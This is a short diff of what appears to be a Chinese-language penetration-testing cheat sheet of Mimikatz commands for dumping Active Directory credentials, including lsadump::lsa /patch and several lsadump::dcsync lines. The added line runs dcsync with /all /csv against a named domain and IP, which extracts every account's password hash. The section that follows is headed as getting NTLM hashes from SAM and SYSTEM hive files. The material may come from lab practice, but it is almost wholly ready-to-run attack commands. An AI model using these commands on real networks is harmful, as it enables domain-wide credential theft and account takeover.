@@ -30,6 +30,9 @@ Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 lsadump::dcsync /domain:kevin.com /user:root
 
 lsadump::dcsync /user:za\krbtgt
+
+lsadump::dcsync /DEV.ADMIN.OFFSHORE.COM:172.16.2.6 /all /csv
+
 ```
 
 # 从sam.hive和system.hive文件中获得NTLM Hash
